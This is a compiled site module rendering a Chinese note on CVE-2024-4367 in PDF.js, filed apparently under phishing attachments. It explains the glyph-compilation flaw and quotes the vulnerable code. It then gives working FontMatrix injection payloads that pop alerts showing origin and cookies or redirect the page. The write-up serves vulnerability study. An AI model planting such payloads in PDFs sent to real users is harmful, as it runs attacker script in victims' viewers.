import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as o,o as p,c,a as n,d as s,b as t,e as l}from"./app-BT-bWAve.js";const r={},i=n("h1",{id:"cve-2024-4367-pdf-js中任意javascript执行",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#cve-2024-4367-pdf-js中任意javascript执行"},[n("span",null,"CVE-2024-4367-PDF.js中任意JavaScript执行")])],-1),u={href:"https://x.com/thomasrinsma/status/1792503111317119185",target:"_blank",rel:"noopener noreferrer"},d={href:"https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/",target:"_blank",rel:"noopener noreferrer"},k={href:"https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/LOURC0D3/CVE-2024-4367-PoC",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/s4vvysec/CVE-2024-4367-POC",target:"_blank",rel:"noopener noreferrer"},b={href:"https://wx.zsxq.com/dweb2/index/topic_detail/1522484211581222",target:"_blank",rel:"noopener noreferrer"},v=n("p",null,"PDF.js 是由 Mozilla 维护的基于 JavaScript 的 PDF viewer",-1),f=n("p",null,"CVE-2024-4367允许攻击者在打开恶意 PDF 文件后立即执行任意 JavaScript 代码",-1),g=n("hr",null,null,-1),_=n("h2",{id:"影响范围",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#影响范围"},[n("span",null,"影响范围")])],-1),x=n("p",null,"所有 Firefox 用户 (<126)，因为 Firefox 使用 PDF.js 来显示 PDF 文件",-1),y=n("p",null,"也会严重影响（间接）许多使用 PDF.js 进行预览功能的基于 Web 和 Electron 的应用程序",-1),F=n("hr",null,null,-1),j=n("p",null,"实测可复现漏洞版本:",-1),C=n("p",null,[n("img",{src:"http://cdn.ayusummer233.top/DailyNotes/202405241346924.png",alt:"image-20240522104457591"})],-1),E=n("p",null,[n("img",{src:"http://cdn.ayusummer233.top/DailyNotes/202405241346242.png",alt:"image-20240522104518122"})],-1),w=n("p",null,"下载 firefox 旧版本:",-1),P=n("li",null,"[安装 Firefox 以前的版本 | Firefox 帮助 (mozilla.org)](https://support.mozilla.org/zh-CN/kb/安装 Firefox 以前的版本)",-1),D={href:"https://ftp.mozilla.org/pub/firefox/releases/",target:"_blank",rel:"noopener noreferrer"},q=n("hr",null,null,-1),V=n("h2",{id:"介绍",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#介绍"},[n("span",null,"介绍")])],-1),S=n("p",null,"PDF.js 有两种常见的用例",-1),B=n("li",null,[n("p",null,"它是 Firefox 内置的 PDF 查看器")],-1),z=n("p",null,[s("它被捆绑到一个名为 "),n("code",null,"pdfjs-dist"),s(" 的 Node 模块中，根据 NPM，每周下载量约为 270 万次")],-1),J=n("p",null,"包括但不限于 Git 托管平台到笔记应用程序都用它来提供 PDF 预览功能",-1),A={href:"https://www.npmjs.com/package/pdfjs-dist",target:"_blank",rel:"noopener noreferrer"},G=n("p",null,[n("img",{src:"http://cdn.ayusummer233.top/DailyNotes/202405241346682.png",alt:"image-20240521170324479"})],-1),N=l(`<hr><h2 id="glyph-rendering-字形渲染" tabindex="-1"><a class="header-anchor" href="#glyph-rendering-字形渲染"><span>Glyph rendering(字形渲染)</span></a></h2><p>这个漏洞和 PDF 的 JavaScript 脚本功能本身无关. 这是在对字体渲染代码的特定部分的疏忽造成的漏洞</p><p>PDF 中的字体可以有多种不同的格式，其中一些格式比其他格式更晦涩。</p><p>对于 TrueType 等现代格式，PDF.js 主要遵循浏览器自己的字体渲染器。</p><p>在其他情况下，它必须手动将字形（即字符）描述转换为页面上的曲线。为了优化性能，它为每个字形预编译了路径生成器函数。</p><p>如果支持的话，可以通过创建一个 JavaScript <code>Function</code> 对象来完成，该对象的主体 ( <code>jsBuf</code> ) 包含组成路径的指令</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token comment">// If we can, compile cmds into JS for MAXIMUM SPEED...</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>isEvalSupported <span class="token operator">&amp;&amp;</span> FeatureTest<span class="token punctuation">.</span>isEvalSupported<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> jsBuf <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> current <span class="token keyword">of</span> cmds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> args <span class="token operator">=</span> current<span class="token punctuation">.</span>args <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">?</span> current<span class="token punctuation">.</span>args<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
    jsBuf<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">&quot;c.&quot;</span><span class="token punctuation">,</span> current<span class="token punctuation">.</span>cmd<span class="token punctuation">,</span> <span class="token string">&quot;(&quot;</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token string">&quot;);\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// eslint-disable-next-line no-new-func</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>jsBuf<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>compiledGlyphs<span class="token punctuation">[</span>character<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span>
    <span class="token string">&quot;c&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;size&quot;</span><span class="token punctuation">,</span>
    jsBuf<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>从攻击者的角度来看，如果我们能够以某种方式控制这些 <code>cmds</code> 进入 <code>Function</code> 主体并插入我们自己的代码，那么一旦这样的字形出现，它就会被执行</p><hr><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token operator">/</span>FontMatrix <span class="token punctuation">[</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">1</span>\\<span class="token punctuation">)</span><span class="token punctuation">;</span> alert\\<span class="token punctuation">(</span><span class="token string">&#39;origin: &#39;</span><span class="token operator">+</span>window<span class="token punctuation">.</span>origin<span class="token operator">+</span><span class="token string">&#39;\\\\npdf url: &#39;</span><span class="token operator">+</span>window<span class="token punctuation">.</span>PDFViewerApplication<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token operator">/</span>FontMatrix <span class="token punctuation">[</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">0</span>\\<span class="token punctuation">)</span><span class="token punctuation">;</span> alert\\<span class="token punctuation">(</span><span class="token string">&#39;foobar&#39;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
  
<span class="token operator">&lt;&lt;</span>
  <span class="token operator">/</span>BaseFont <span class="token operator">/</span><span class="token constant">SNCSTG</span><span class="token operator">+</span><span class="token constant">CMBX12</span>
  <span class="token operator">/</span>FontDescriptor <span class="token number">7</span> <span class="token number">0</span> <span class="token constant">R</span>
  <span class="token operator">/</span>Subtype <span class="token operator">/</span>Type1
  <span class="token operator">/</span>FontMatrix <span class="token punctuation">[</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">0</span>\\<span class="token punctuation">)</span><span class="token punctuation">;</span> alert\\<span class="token punctuation">(</span><span class="token string">&#39;foobar&#39;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
  <span class="token operator">/</span>Type <span class="token operator">/</span>Font
<span class="token operator">&gt;&gt;</span>
      
<span class="token operator">/</span>FontMatrix <span class="token punctuation">[</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">0</span>\\<span class="token punctuation">)</span><span class="token punctuation">;</span> location<span class="token punctuation">.</span>href<span class="token operator">=</span>\\<span class="token punctuation">(</span><span class="token string">&#39;https://www.baidu.com&#39;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token operator">/</span>FontMatrix <span class="token punctuation">[</span><span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">1</span>\\<span class="token punctuation">)</span><span class="token punctuation">;</span> alert\\<span class="token punctuation">(</span><span class="token string">&#39;document.domain: &#39;</span><span class="token operator">+</span>window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>domain<span class="token operator">+</span><span class="token string">&#39;\\\\nlocation: &#39;</span><span class="token operator">+</span>window<span class="token punctuation">.</span>location<span class="token operator">+</span><span class="token string">&#39;\\\\ncookie: &#39;</span><span class="token operator">+</span>window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11),T={href:"https://wx.zsxq.com/dweb2/index/topic_detail/1522484211581222",target:"_blank",rel:"noopener noreferrer"},M=n("hr",null,null,-1);function H(R,L){const a=o("ExternalLinkIcon");return p(),c("div",null,[i,n("blockquote",null,[n("p",null,[n("a",u,[s("(1) X 上的 Thomas Rinsma：“Just released the write-up for CVE-2024-4367, a bug I found recently in PDF.js (and hence in Firefox), resulting in arbitrary JavaScript execution when opening a malicious PDF. https://t.co/sex6fR0xHS” / X"),t(a)])]),n("p",null,[n("a",d,[s("CVE-2024-4367 - Arbitrary JavaScript execution in PDF.js — Codean Labs"),t(a)])]),n("p",null,[n("a",k,[s("Arbitrary JavaScript execution upon opening a malicious PDF · Advisory · mozilla/pdf.js · GitHub"),t(a)])]),n("p",null,[n("a",m,[s("GitHub - LOURC0D3/CVE-2024-4367-PoC: CVE-2024-4367 & CVE-2024-34342 Proof of Concept"),t(a)])]),n("p",null,[n("a",h,[s("GitHub - s4vvysec/CVE-2024-4367-POC: CVE-2024-4367 arbitrary js execution in pdf js"),t(a)])]),n("p",null,[n("a",b,[s("知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)"),t(a)])])]),v,f,g,_,x,y,F,n("blockquote",null,[j,C,E,w,n("ul",null,[P,n("li",null,[n("a",D,[s("Directory Listing: /pub/firefox/releases/ (mozilla.org)"),t(a)])])])]),q,V,S,n("ul",null,[B,n("li",null,[z,J,n("blockquote",null,[n("p",null,[n("a",A,[s("pdfjs-dist - npm (npmjs.com)"),t(a)])]),G])])]),N,n("p",null,[n("a",T,[s("知识星球 | CVE-2024-4367"),t(a)]),s(" 中目前似乎还没看到什么更实际的利用方式")]),M])}const X=e(r,[["render",H],["__file","index.html.vue"]]),U=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/PDF/PDF%E9%98%85%E8%AF%BB%E5%99%A8%E6%BC%8F%E6%B4%9E/CVE-2024-4367_Arbitrary-JavaScript-execution-in-PDF-js/","title":"CVE-2024-4367-PDF.js中任意JavaScript执行","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]},{"level":2,"title":"介绍","slug":"介绍","link":"#介绍","children":[]},{"level":2,"title":"Glyph rendering(字形渲染)","slug":"glyph-rendering-字形渲染","link":"#glyph-rendering-字形渲染","children":[]}],"git":{"createdTime":1716951379000,"updatedTime":1716951379000,"contributors":[{"name":"233","email":"ayusummer233@gmail.com","commits":1}]},"readingTime":{"minutes":2.59,"words":777},"filePathRelative":"网络安全/钓鱼/钓鱼附件/PDF/PDF阅读器漏洞/CVE-2024-4367_Arbitrary-JavaScript-execution-in-PDF-js/index.md","localizedDate":"2024年5月29日","excerpt":"\\n<blockquote>\\n<p><a href=\\"https://x.com/thomasrinsma/status/1792503111317119185\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">(1) X 上的 Thomas Rinsma：“Just released the write-up for CVE-2024-4367, a bug I found recently in PDF.js (and hence in Firefox), resulting in arbitrary JavaScript execution when opening a malicious PDF. https://t.co/sex6fR0xHS” / X</a></p>\\n<p><a href=\\"https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">CVE-2024-4367 - Arbitrary JavaScript execution in PDF.js — Codean Labs</a></p>\\n<p><a href=\\"https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">Arbitrary JavaScript execution upon opening a malicious PDF · Advisory · mozilla/pdf.js · GitHub</a></p>\\n<p><a href=\\"https://github.com/LOURC0D3/CVE-2024-4367-PoC\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">GitHub - LOURC0D3/CVE-2024-4367-PoC: CVE-2024-4367 &amp; CVE-2024-34342 Proof of Concept</a></p>\\n<p><a href=\\"https://github.com/s4vvysec/CVE-2024-4367-POC\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">GitHub - s4vvysec/CVE-2024-4367-POC: CVE-2024-4367 arbitrary js execution in pdf js</a></p>\\n<p><a href=\\"https://wx.zsxq.com/dweb2/index/topic_detail/1522484211581222\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>\\n</blockquote>"}');export{X as comp,U as data};
